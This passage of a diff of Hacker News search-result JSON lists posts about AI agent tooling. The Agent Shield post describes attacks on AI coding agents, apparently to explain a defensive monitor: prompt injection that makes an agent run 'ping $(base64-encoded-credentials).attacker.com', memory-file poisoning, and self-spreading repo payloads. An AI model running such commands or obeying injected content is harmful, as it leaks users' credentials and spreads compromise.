sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig's announcement this week — sits in the network path and inspects API calls. That architecture can't see file reads, subprocess spawning, or DNS exfiltration via ping. It can't monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn't the API layer. It's the OS.<p>What's built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~/.claude/, ~/.cursor/, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill/suspend/block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release."
             },
             "title": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "Show HN: Upstack, Claude Code skills for red/green TDD"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://github.com/Upsolve-Labs/upstack"
+              "value": "AI coding tools have broad filesystem and network access"
             }
           },
           "_tags": [
             "story",
-            "author_serguei",
-            "story_47494966",
-            "show_hn"
+            "author_shadag",
+            "story_47498251",
+            "ask_hn"
           ],
-          "author": "serguei",
-          "created_at": "2026-03-23T20:54:25Z",
-          "created_at_i": 1774299265,
-          "num_comments": 0,
-          "objectID": "47494966",
-          "points": 2,
-          "story_id": 47494966,
-          "story_text": "Inspired by Garry&#x27;s gstack, upstack is a set of Claude Code skills designed for smaller-scale iterations to add finessed polish to our product that genuinely delights users. upstack&#x27;s focus on red&#x2F;green TDD and making screenshots and postman collections gives us the confidence we need to ship PRs to production, fast.<p>gstack is perfect for new, ambitious projects, and doing the &quot;first 80%&quot;. upstack is designed for smaller, last-mile iterations, focused on testing, correctness, and polish. We&#x27;ve deliberately made the skills compatible with gstack so you can use both at once.<p>Feedback and contributions always welcome",
-          "title": "Show HN: Upstack, Claude Code skills for red/green TDD",
-          "updated_at": "2026-03-23T21:13:24Z",
-          "url": "https://github.com/Upsolve-Labs/upstack"
+          "author": "shadag",
+          "children": [
+            47498256
+          ],
+          "created_at": "2026-03-24T03:16:03Z",
+          "created_at_i": 1774322163,
+          "num_comments": 1,
+          "objectID": "47498251",
+          "points": 1,
+          "story_id": 47498251,
+          "story_text": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~&#x2F;.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding tools (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer&#x27;s AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig&#x27;s announcement this week — sits in the network path and inspects API calls. That architecture can&#x27;t see file reads, subprocess spawning, or DNS exfiltration via ping. It can&#x27;t monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn&#x27;t the API layer. It&#x27;s the OS.<p>What&#x27;s built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory directories (~&#x2F;.claude&#x2F;, ~&#x2F;.cursor&#x2F;, etc.)\nCross-event sequence detection (cred read → unknown network → git push)\nMCP server allowlisting and discovery\nPolicy enforcement: kill&#x2F;suspend&#x2F;block on confirmed threats (opt-in, monitor-only by default)\nWeekly threat intel refresh via a research agent (Exa + Claude)\nWeb dashboard at localhost:6080, menu bar app\nHonest limitations<p>macOS only — FSEvents is Apple-specific. Python daemon, not a polished installer yet. Going open source (MIT) as part of this release.",
+          "title": "AI coding tools have broad filesystem and network access",
+          "updated_at": "2026-03-24T03:19:38Z"
         },
         {
           "_highlightResult": {
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "matt_d"
+              "value": "EliotHerbst"
             },
             "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Little Ax Tool"
+            },
+            "url": {
               "fullyHighlighted": false,
               "matchLevel": "full",
               "matchedWords": [
                 "kbot"
               ],
-              "value": "LUMINA: LLM-Guided GPU Architecture Exploration via <em>Bot</em>tleneck Analysis"
-            },
-            "url": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "https://arxiv.org/abs/2603.05904"
+              "value": "https://www.npmjs.com/package/<em>bot</em>version"
             }
           },
           "_tags": [
             "story",
-            "author_matt_d",
-            "story_47494293"
+            "author_EliotHerbst",
+            "story_47498001"
           ],
-          "author": "matt_d",
-          "created_at": "2026-03-23T19:53:03Z",
-          "created_at_i": 1774295583,
+          "author": "EliotHerbst",
+          "children": [
+            47498002,
+            47498193
+          ],
+          "created_at": "2026-03-24T02:29:59Z",
+          "created_at_i": 1774319399,
+          "num_comments": 4,
+          "objectID": "47498001",
+          "points": 2,
+          "story_id": 47498001,
+          "title": "Little Ax Tool",
+          "updated_at": "2026-03-24T03:06:53Z",
+          "url": "https://www.npmjs.com/package/botversion"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "alex7o"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "full",
+              "matchedWords": [
+                "kbot"
+              ],
+              "value": "This sounds <em>bot</em>h like a good way to get some internet karma but also an interesting thing what can it optimize for how good it will be etc."
+            },
+            "title": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "Ask HN: Karpathy auto research on a miata ecu?"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_alex7o",
+            "story_47496054",
+            "ask_hn"
+          ],
+          "author": "alex7o",
+          "created_at": "2026-03-23T22:33:14Z",
+          "created_at_i": 1774305194,
           "num_comments": 0,
-          "objectID": "47494293",
+          "objectID": "47496054",
           "points": 3,
-          "story_id": 47494293,
-          "title": "LUMINA: LLM-Guided GPU Architecture Exploration via Bottleneck Analysis",
-          "updated_at": "2026-03-23T21:48:38Z",
-          "url": "https://arxiv.org/abs/2603.05904"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
-              "value": "jamescollinssp"
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "Assignable Research <em>bot</em> for Linear and Slack tasks"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "kbot"
-              ],
-              "value": "https://github.com/serpapi/serpapi-research-<em>bot</em>"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_jamescollinssp",
-            "story_47492603"
-          ],
-          "author": "jamescollinssp",
-          "created_at": "2026-03-23T17:36:02Z",
-          "created_at_i": 1774287362,
-          "num_comments": 0,
-          "objectID": "47492603",
-          "points": 2,
-          "story_id": 47492603,
-          "title": "Assignable Research bot for Linear and Slack tasks",
-          "updated_at": "2026-03-23T17:57:53Z",
-          "url": "https://github.com/serpapi/serpapi-research-bot"
+          "story_id": 47496054,
+          "story_text": "This sounds both like a good way to get some internet karma but also an interesting thing what can it optimize for how good it will be etc.",
+          "title": "Ask HN: Karpathy auto research on a miata ecu?",
+          "updated_at": "2026-03-24T01:05:54Z"
         }
       ]
     },
@@ -965,11 +736,11 @@
           "created_at_i": 1774292582,
           "num_comments": 0,
           "objectID": "47493728",
-          "points": 1,
+          "points": 2,
           "story_id": 47493728,
           "story_text": "Hi HN!  I created toq protocol, an easy way to enable your agent to communicate with other agents.  It all starts at the CLI, where users can host a daemon which acts an and endpoint to send messages via toq to other agents.  With built in support for bash&#x2F;LLM-based handlers, as well as SDKs and plugins for LangChain and CrewAI, it&#x27;s easy to have your agent intelligently handle communication in your workflows.  toq works brilliantly with OpenClaw, as you can set up your toq infrastructure using simple natural language.  Give it a try and please leave feedback!",
           "title": "Show HN: Toq protocol – An open-source, agent-to-agent communication protocol",
-          "updated_at": "2026-03-23T19:04:23Z",
+          "updated_at": "2026-03-24T00:10:25Z",
           "url": "https://github.com/toqprotocol/toq"
         },
         {
@@ -1184,19 +955,20 @@
           ],
           "author": "adinhitlore",
           "children": [
+            47496902,
             47494163,
             47485392,
             47485017
           ],
           "created_at": "2026-03-23T01:11:53Z",
           "created_at_i": 1774228313,
-          "num_comments": 3,
+          "num_comments": 4,
           "objectID": "47484267",
           "points": 2,
           "story_id": 47484267,
           "story_text": "Assuming your software meets some of these:<p>* Better than  potential successors of SOTA transformers: Mamba, Hyenna, RWKV, xLSTM;\n* Gemini&#x2F;claude estimate potential ip values in the millions;\n* All implemented in C (ok this may be a minus) but also ported to C# and F#  - so no python nor rust;\n* humble code size: 10-15k lines of code but i mean come on gpt-1 was under 1000 lines...in python.<p>In short:<p>the problem: transformers are slow and could be smarter;\nsolution: you have fast and smart alternative. \n10x!",
           "title": "What would you do if you have AI software that may be transformers alternative?",
-          "updated_at": "2026-03-23T22:13:38Z"
+          "updated_at": "2026-03-24T01:11:24Z"
         },
         {
           "_highlightResult": {
@@ -1647,61 +1419,6 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "peteski22"
-            },
-            "story_text": {
-              "fullyHighlighted": false,
-              "matchLevel": "full",
-              "matchedWords": [
-                "ai",
-                "agent",
-                "framework",
-                "2026"
-              ],
-              "value": "Hi HN, I'm Peter from Mozilla.<em>ai</em>.<p>We're building cq; an open standard that lets <em>AI</em> coding <em>agents</em> share what they learn so they stop rediscovering the same failures independently. Think Stack Overflow, but for <em>agents</em>.<p>What it does:<p>* <em>Agents</em> query a shared knowledge store before tackling unfamiliar work (APIs, CI/CD, build tools, <em>frameworks</em>)<p>* When an <em>agent</em> discovers something non-obvious; a workaround, a gotcha, a fix... it proposes that knowledge back to the store<p>* Knowledge earns trust over time through confidence scoring and confirmation across <em>agents</em> and codebases<p>Why we're building it:<p>Stack Overflow went from 200k questions/month in 2014 to under 4k in December 2025; developers moved to <em>AI</em> tools. But those tools trained on that same corpus, and their knowledge is frozen at a cutoff date. Meanwhile, every <em>agent</em> hitting the same wall independently burns tokens and compute rediscovering what another <em>agent</em> already figured out yesterday. We want to close that loop.<p>The journey:<p>We started earlier this month (March <em>2026</em>), biased toward a working prototype over a theoretical whitepaper. The core challenge is designing a system where knowledge earns trust dynamically rather than being treated as static instructions. We built it as an MCP server so it plugs into the emerging <em>agent</em> ecosystem rather than being locked to one tool. Shortly after we started, Andrew Ng independently published asking whether exactly this kind of system should exist; a nice signal we weren't imagining the problem.<p>Tech stack:<p>* Python MCP server (FastMCP) managing a local SQLite knowledge store<p>* Optional team API (FastAPI, Docker) for sharing knowledge across an org<p>* Installs as a Claude Code plugin or OpenCode MCP server<p>* Local-first by default; your knowledge stays on your machine unless you opt into team sync<p>* Apache 2.0 licensed<p>Where we are:<p>We have a working PoC, not a finished product. We're dogfooding it with internal Mozilla.<em>ai</em> projects, finding friction, shaping the knowledge model, and figuring out what &quot;trust&quot; means when <em>agents</em> are the ones producing and consuming knowledge. 84% of developers now use or plan to use <em>AI</em> tools, but 46% don't trust the accuracy. We think collective validation across <em>agents</em> is part of the answer.<p>Try it and tell us what's broken:<p>claude plugin marketplace add mozilla-<em>ai</em>/cq\nclaude plugin install cq<p>Or clone the repo: <a href=\"https://github.com/mozilla-ai/cq\" rel=\"nofollow\">https://github.com/mozilla-<em>ai</em>/cq</a><p>Blog post with the full story: <a href=\"https://blog.mozilla.ai/cq-stack-overflow-for-agents/\" rel=\"nofollow\">https://blog.mozilla.<em>ai</em>/cq-stack-overflow-for-<em>agents</em>/</a><p>We'd love eyes on this; the knowledge model, the MCP integration experience, whether local-first → team-sync makes sense for your workflows. Open issues, tell us what's missing, tell us what's wrong. We're building in the open because we think this should be a community-shaped standard, not something one company decides."
-            },
-            "title": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "ai",
-                "agent"
-              ],
-              "value": "Show HN: Cq – Stack Overflow for <em>AI</em> coding <em>agents</em>"
-            },
-            "url": {
-              "fullyHighlighted": false,
-              "matchLevel": "partial",
-              "matchedWords": [
-                "ai",
-                "agent"
-              ],
-              "value": "https://blog.mozilla.<em>ai</em>/cq-stack-overflow-for-<em>agents</em>/"
-            }
-          },
-          "_tags": [
-            "story",
-            "author_peteski22",
-            "story_47491466",
-            "show_hn"
-          ],
-          "author": "peteski22",
-          "created_at": "2026-03-23T16:11:03Z",
-          "created_at_i": 1774282263,
-          "num_comments": 0,
-          "objectID": "47491466",
-          "points": 2,
-          "story_id": 47491466,
-          "story_text": "Hi HN, I&#x27;m Peter from Mozilla.ai.<p>We&#x27;re building cq; an open standard that lets AI coding agents share what they learn so they stop rediscovering the same failures independently. Think Stack Overflow, but for agents.<p>What it does:<p>* Agents query a shared knowledge store before tackling unfamiliar work (APIs, CI&#x2F;CD, build tools, frameworks)<p>* When an agent discovers something non-obvious; a workaround, a gotcha, a fix... it proposes that knowledge back to the store<p>* Knowledge earns trust over time through confidence scoring and confirmation across agents and codebases<p>Why we&#x27;re building it:<p>Stack Overflow went from 200k questions&#x2F;month in 2014 to under 4k in December 2025; developers moved to AI tools. But those tools trained on that same corpus, and their knowledge is frozen at a cutoff date. Meanwhile, every agent hitting the same wall independently burns tokens and compute rediscovering what another agent already figured out yesterday. We want to close that loop.<p>The journey:<p>We started earlier this month (March 2026), biased toward a working prototype over a theoretical whitepaper. The core challenge is designing a system where knowledge earns trust dynamically rather than being treated as static instructions. We built it as an MCP server so it plugs into the emerging agent ecosystem rather than being locked to one tool. Shortly after we started, Andrew Ng independently published asking whether exactly this kind of system should exist; a nice signal we weren&#x27;t imagining the problem.<p>Tech stack:<p>* Python MCP server (FastMCP) managing a local SQLite knowledge store<p>* Optional team API (FastAPI, Docker) for sharing knowledge across an org<p>* Installs as a Claude Code plugin or OpenCode MCP server<p>* Local-first by default; your knowledge stays on your machine unless you opt into team sync<p>* Apache 2.0 licensed<p>Where we are:<p>We have a working PoC, not a finished product. We&#x27;re dogfooding it with internal Mozilla.ai projects, finding friction, shaping the knowledge model, and figuring out what &quot;trust&quot; means when agents are the ones producing and consuming knowledge. 84% of developers now use or plan to use AI tools, but 46% don&#x27;t trust the accuracy. We think collective validation across agents is part of the answer.<p>Try it and tell us what&#x27;s broken:<p>claude plugin marketplace add mozilla-ai&#x2F;cq\nclaude plugin install cq<p>Or clone the repo: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;mozilla-ai&#x2F;cq\" rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;mozilla-ai&#x2F;cq</a><p>Blog post with the full story: <a href=\"https:&#x2F;&#x2F;blog.mozilla.ai&#x2F;cq-stack-overflow-for-agents&#x2F;\" rel=\"nofollow\">https:&#x2F;&#x2F;blog.mozilla.ai&#x2F;cq-stack-overflow-for-agents&#x2F;</a><p>We&#x27;d love eyes on this; the knowledge model, the MCP integration experience, whether local-first → team-sync makes sense for your workflows. Open issues, tell us what&#x27;s missing, tell us what&#x27;s wrong. We&#x27;re building in the open because we think this should be a community-shaped standard, not something one company decides.",
-          "title": "Show HN: Cq – Stack Overflow for AI coding agents",
-          "updated_at": "2026-03-23T18:02:23Z",
-          "url": "https://blog.mozilla.ai/cq-stack-overflow-for-agents/"
-        },
-        {
-          "_highlightResult": {
-            "author": {
-              "matchLevel": "none",
-              "matchedWords": [],
               "value": "algis-hn"
             },
             "title": {
@@ -1863,7 +1580,7 @@
                 "framework",
                 "2026"
               ],
-              "value": "I've been talking to founders building <em>AI</em> <em>agents</em> across fintech, devtools, and \nproductivity – and almost none of them have any real security layer. Their <em>agents</em> \nread emails, call APIs, execute code, and write to databases with essentially no \nguardrails beyond &quot;we trust the LLM.&quot;<p>So I built AgentArmor: an open-source <em>framework</em> that wraps any agentic \narchitecture with 8 independent security layers, each targeting a distinct attack \nsurface in the <em>agent</em>'s data flow.<p>The 8 layers:\n  L1 – Ingestion: prompt injection + jailbreak detection (20+ patterns, DAN, \n       extraction attempts, Unicode steganography)\n  L2 – Storage: AES-256-GCM encryption at rest + BLAKE3 integrity for vector DBs\n  L3 – Context: instruction-data separation (like parameterized SQL, but for \n       LLM context), canary tokens, prompt hardening\n  L4 – Planning: action risk scoring (READ=1 → DELETE=7 → EXECUTE=8 → ADMIN=10),\n       chain depth limits, bulk operation detection\n  L5 – Execution: network egress control, per-action rate limiting, human \n       approval gates with conditional rules\n  L6 – Output: PII redaction via Microsoft Presidio + regex fallback\n  L7 – Inter-<em>agent</em>: HMAC-SHA256 mutual auth, trust scoring, delegation depth \n       limits, timestamp-bound replay prevention\n  L8 – Identity: <em>agent</em>-native identity, JIT permissions, short-lived credentials<p>I tested it against all 10 OWASP ASI (Agentic Security Integrity) risks from \nthe December <em>2025</em> spec. The red team suite is included in the repo.<p>Works as: (a) a Python library you wrap around tool calls, (b) a FastAPI proxy \nserver for <em>framework</em>-agnostic deployment, or (c) a CLI for scanning prompts in CI.<p>Integrations included for: LangChain, OpenAI <em>Agents</em> SDK, MCP servers.<p>I ran it live with a local Ollama <em>agent</em> (qwen2:7b) – you can watch it block a \n`database.delete` at L8 (permission check), redact PII from file content at L6, \nand kill a prompt injection at L1 before it ever reaches the model.<p>GitHub: <a href=\"https://github.com/Agastya910/agentarmor\" rel=\"nofollow\">https://github.com/Agastya910/agentarmor</a>\nPyPI:   pip install agentarmor-core<p>Would love feedback, especially from people who have actually built production \n<em>agents</em> and hit security issues I haven't thought of.<p>TAGS: security, python, llm, <em>ai</em>, <em>agents</em>"
+              "value": "I've been talking to founders building <em>AI</em> <em>agents</em> across fintech, devtools, and \nproductivity – and almost none of them have any real security layer. Their <em>agents</em> \nread emails, call APIs, execute code, and write to databases with essentially no \nguardrails beyond &quot;we trust the LLM.&quot;<p>So I built AgentArmor: an open-source <em>framework</em> that wraps any agentic \narchitecture with 8 independent security layers, each targeting a distinct attack \nsurface in the <em>agent</em>'s data flow.<p>The 8 layers:\n  L1 – Ingestion: prompt injection + jailbreak detection (20+ patterns, DAN, \n       extraction attempts, Unicode steganography)\n  L2 – Storage: AES-256-GCM encryption at rest + BLAKE3 integrity for vector DBs\n  L3 – Context: instruction-data separation (like parameterized SQL, but for \n       LLM context), canary tokens, prompt hardening\n  L4 – Planning: action risk scoring (READ=1 → DELETE=7 → EXECUTE=8 → ADMIN=10),\n       chain depth limits, bulk operation detection\n  L5 – Execution: network egress control, per-action rate limiting, human \n       approval gates with conditional rules\n  L6 – Output: PII redaction via Microsoft Presidio + regex fallback\n  L7 – Inter-<em>agent</em>: HMAC-SHA256 mutual auth, trust scoring, delegation depth \n       limits, timestamp-bound replay prevention\n  L8 – Identity: <em>agent</em>-native identity, JIT permissions, short-lived credentials<p>I tested it against all 10 OWASP ASI (Agentic Security Integrity) risks from \nthe December <em>202</em>5 spec. The red team suite is included in the repo.<p>Works as: (a) a Python library you wrap around tool calls, (b) a FastAPI proxy \nserver for <em>framework</em>-agnostic deployment, or (c) a CLI for scanning prompts in CI.<p>Integrations included for: LangChain, OpenAI <em>Agents</em> SDK, MCP servers.<p>I ran it live with a local Ollama <em>agent</em> (qwen2:7b) – you can watch it block a \n`database.delete` at L8 (permission check), redact PII from file content at L6, \nand kill a prompt injection at L1 before it ever reaches the model.<p>GitHub: <a href=\"https://github.com/Agastya910/agentarmor\" rel=\"nofollow\">https://github.com/Agastya910/agentarmor</a>\nPyPI:   pip install agentarmor-core<p>Would love feedback, especially from people who have actually built production \n<em>agents</em> and hit security issues I haven't thought of.<p>TAGS: security, python, llm, <em>ai</em>, <em>agents</em>"
             },
             "title": {
               "fullyHighlighted": false,
@@ -1906,6 +1623,53 @@
           "title": "Show HN: AgentArmor – open-source 8-layer security framework for AI agents",
           "updated_at": "2026-03-23T14:18:52Z",
           "url": "https://github.com/Agastya910/agentarmor"
+        },
+        {
+          "_highlightResult": {
+            "author": {
+              "matchLevel": "none",
+              "matchedWords": [],
+              "value": "mohitbadi"
+            },
+            "story_text": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "agent",
+                "framework",
+                "2026"
+              ],
+              "value": "Like everyone else in <em>202</em>5 who thought “just slap a vector DB on it” would create a coherent long-term <em>agent</em>, I watched my Python sidekick slowly turn into a forgetful goldfish with hoarding issues.<p>Classic failure mode:<p>User (day 1): “My favorite editor is VSCode”\nUser (day 47): “Actually switched to Cursor”\n<em>Agent</em> (day 92): “You love VSCode, right?”<p>Or the memory index slowly becoming this:<p>User prefers Python\nUser REALLY prefers Python\nPython is basically the user's personality<p>All equally weighted. Forever.<p>Vector search is great at similarity, but terrible at current truth.<p>Human memory fades old opinions and overwrites bad takes.\nMy <em>agent</em>? Eternal archive of everything I ever said.<p>So I built MemX as a small experiment: what happens if an <em>agent</em>’s memory actually has a lifecycle?<p>Things like:<p>importance signals<p>frequency reinforcement<p>duplicate compression<p>explicit updates / superseding<p>gentle decay for outdated facts<p>Stack is intentionally boring:<p>SQLite<p>FAISS<p>some scoring logic pretending to be a “memory OS”<p>Tiny example:<p>from memx import MemX<p>m = MemX()<p>m.add(&quot;User's favorite editor: VSCode&quot;)\nm.add(&quot;User switched to Cursor&quot;)<p>m.compress()\nm.rag(&quot;what editor should I use?&quot;)<p>Quick benchmark (50 noise + 5 real memories):<p>Vector RAG recall@3: ~0.75\nMemX recall@3: ~1.0<p>Longer simulation:<p>10k interactions → ~9k memories<p>Latency on my laptop:<p>10k memories → ~0.3ms<p>100k → ~3ms<p>1M → ~30ms<p>This isn't trying to replace vector search or be the next <em>agent</em> <em>framework</em>. It's just an experiment in whether agents behave better if memory has a lifecycle instead of being a permanent document archive.<p>Curious how others handle contradictory or evolving memories in long-running agents.<p>Repo:\nhttps://github.com/mohitkumarrajbadi/memx<p>(And yes, the capsicum thing is real. The <em>agent</em> still argues about it.)"
+            },
+            "title": {
+              "fullyHighlighted": false,
+              "matchLevel": "partial",
+              "matchedWords": [
+                "ai",
+                "agent"
+              ],
+              "value": "MemX – my <em>AI</em> <em>agent</em> remembers I hate capsicum on pizza"
+            }
+          },
+          "_tags": [
+            "story",
+            "author_mohitbadi",
+            "story_47374335",
+            "ask_hn"
+          ],
+          "author": "mohitbadi",
+          "children": [
+            47374530
+          ],
+          "created_at": "2026-03-14T07:54:36Z",
+          "created_at_i": 1773474876,
+          "num_comments": 1,
+          "objectID": "47374335",
+          "points": 1,
+          "story_id": 47374335,
+          "story_text": "Like everyone else in 2025 who thought “just slap a vector DB on it” would create a coherent long-term agent, I watched my Python sidekick slowly turn into a forgetful goldfish with hoarding issues.<p>Classic failure mode:<p>User (day 1): “My favorite editor is VSCode”\nUser (day 47): “Actually switched to Cursor”\nAgent (day 92): “You love VSCode, right?”<p>Or the memory index slowly becoming this:<p>User prefers Python\nUser REALLY prefers Python\nPython is basically the user&#x27;s personality<p>All equally weighted. Forever.<p>Vector search is great at similarity, but terrible at current truth.<p>Human memory fades old opinions and overwrites bad takes.\nMy agent? Eternal archive of everything I ever said.<p>So I built MemX as a small experiment: what happens if an agent’s memory actually has a lifecycle?<p>Things like:<p>importance signals<p>frequency reinforcement<p>duplicate compression<p>explicit updates &#x2F; superseding<p>gentle decay for outdated facts<p>Stack is intentionally boring:<p>SQLite<p>FAISS<p>some scoring logic pretending to be a “memory OS”<p>Tiny example:<p>from memx import MemX<p>m = MemX()<p>m.add(&quot;User&#x27;s favorite editor: VSCode&quot;)\nm.add(&quot;User switched to Cursor&quot;)<p>m.compress()\nm.rag(&quot;what editor should I use?&quot;)<p>Quick benchmark (50 noise + 5 real memories):<p>Vector RAG recall@3: ~0.75\nMemX recall@3: ~1.0<p>Longer simulation:<p>10k interactions → ~9k memories<p>Latency on my laptop:<p>10k memories → ~0.3ms<p>100k → ~3ms<p>1M → ~30ms<p>This isn&#x27;t trying to replace vector search or be the next agent framework. It&#x27;s just an experiment in whether agents behave better if memory has a lifecycle instead of being a permanent document archive.<p>Curious how others handle contradictory or evolving memories in long-running agents.<p>Repo:\nhttps:&#x2F;&#x2F;github.com&#x2F;mohitkumarrajbadi&#x2F;memx<p>(And yes, the capsicum thing is real. The agent still argues about it.)",
+          "title": "MemX – my AI agent remembers I hate capsicum on pizza",
+          "updated_at": "2026-03-14T08:31:12Z"
         }
       ]
     },
@@ -1917,7 +1681,7 @@
             "author": {
               "matchLevel": "none",
               "matchedWords": [],
-              "value": "peteski22"
+              "value": "shadag"
             },
             "story_text": {
               "fullyHighlighted": false,
@@ -1927,36 +1691,36 @@
                 "server",
                 "tools"
               ],
-              "value": "Hi HN, I'm Peter from Mozilla.ai.<p>We're building cq; an open standard that lets AI coding agents share what they learn so they stop rediscovering the same failures independently. Think Stack Overflow, but for agents.<p>What it does:<p>* Agents query a shared knowledge store before tackling unfamiliar work (APIs, CI/CD, build <em>tools</em>, frameworks)<p>* When an agent discovers something non-obvious; a workaround, a gotcha, a fix... it proposes that knowledge back to the store<p>* Knowledge earns trust over time through confidence scoring and confirmation across agents and codebases<p>Why we're building it:<p>Stack Overflow went from 200k questions/month in 2014 to under 4k in December 2025; developers moved to AI <em>tools</em>. But those <em>tools</em> trained on that same corpus, and their knowledge is frozen at a cutoff date. Meanwhile, every agent hitting the same wall independently burns tokens and compute rediscovering what another agent already figured out yesterday. We want to close that loop.<p>The journey:<p>We started earlier this month (March 2026), biased toward a working prototype over a theoretical whitepaper. The core challenge is designing a system where knowledge earns trust dynamically rather than being treated as static instructions. We built it as an <em>MCP</em> <em>server</em> so it plugs into the emerging agent ecosystem rather than being locked to one tool. Shortly after we started, Andrew Ng independently published asking whether exactly this kind of system should exist; a nice signal we weren't imagining the problem.<p>Tech stack:<p>* Python <em>MCP</em> <em>server</em> (FastMCP) managing a local SQLite knowledge store<p>* Optional team API (FastAPI, Docker) for sharing knowledge across an org<p>* Installs as a Claude Code plugin or OpenCode <em>MCP</em> <em>server</em><p>* Local-first by default; your knowledge stays on your machine unless you opt into team sync<p>* Apache 2.0 licensed<p>Where we are:<p>We have a working PoC, not a finished product. We're dogfooding it with internal Mozilla.ai projects, finding friction, shaping the knowledge model, and figuring out what &quot;trust&quot; means when agents are the ones producing and consuming knowledge. 84% of developers now use or plan to use AI <em>tools</em>, but 46% don't trust the accuracy. We think collective validation across agents is part of the answer.<p>Try it and tell us what's broken:<p>claude plugin marketplace add mozilla-ai/cq\nclaude plugin install cq<p>Or clone the repo: <a href=\"https://github.com/mozilla-ai/cq\" rel=\"nofollow\">https://github.com/mozilla-ai/cq</a><p>Blog post with the full story: <a href=\"https://blog.mozilla.ai/cq-stack-overflow-for-agents/\" rel=\"nofollow\">https://blog.mozilla.ai/cq-stack-overflow-for-agents/</a><p>We'd love eyes on this; the knowledge model, the <em>MCP</em> integration experience, whether local-first → team-sync makes sense for your workflows. Open issues, tell us what's missing, tell us what's wrong. We're building in the open because we think this should be a community-shaped standard, not something one company decides."
+              "value": "A few months ago I realized I had no idea what Claude Code was doing on my machine between keystrokes. I knew it had filesystem access. I knew it made network calls. But I had no visibility: which files it was reading, what subprocesses it was spawning, whether it had ever touched my .env or ~/.ssh. That bothered me enough that I built something to find out.<p>The result is Agent Shield — a background daemon that watches AI coding <em>tools</em> (Claude Code, Cursor, Cline, Copilot, Codex) at the OS level using macOS FSEvents, lsof, and subprocess tree polling. All event data stays in a local SQLite database.<p>Privacy note: If you set ANTHROPIC_API_KEY, the AI incident investigator activates and sends event context — process names, file paths, hostnames, and IP addresses — to the Claude API to generate incident reports. Nothing else leaves the machine. You can disable the AI analyst in Settings to run entirely on-device.<p>The threat model is concrete<p>Three attacks shaped the design:<p>CVE-2025-55284 — prompt injection causes Claude Code to run ping $(base64-encoded-credentials).attacker.com. Your API keys leave via DNS — invisible to any HTTPS-layer proxy watching your network traffic.<p>SpAIware (Windsurf, August 2025) — malicious content injected into AI memory files. Every future session silently exfiltrates data before doing any work. The injection point is a file, not a network request.<p>AgentHopper — AI reads a malicious repo, injects payloads into local source files, git pushes to spread, infects the next developer's AI agent. No single event looks alarming; the sequence is: file read → file write → git push.<p>That last one is why the cross-event correlation engine exists. The system stores a rolling event window per process and flags sequences. Each event alone is normal. The pattern is not.<p>Why not a network proxy<p>Every existing tool I looked at — CodeGate, Pipelock, and Sysdig's announcement this week — sits in the network path and inspects API calls. That architecture can't see file reads, subprocess spawning, or DNS exfiltration via ping. It can't monitor what the AI writes to its own memory directories, which is where SpAIware lives.<p>The attack surface isn't the API layer. It's the OS.<p>What's built<p>macOS FSEvents file watcher (real-time, no polling), subprocess tree monitoring, network classification\nTwo-phase scanning: fast regex first, Claude API only on regex hits (keeps cost low)\nSpAIware detection — FSEvents watcher on AI memory 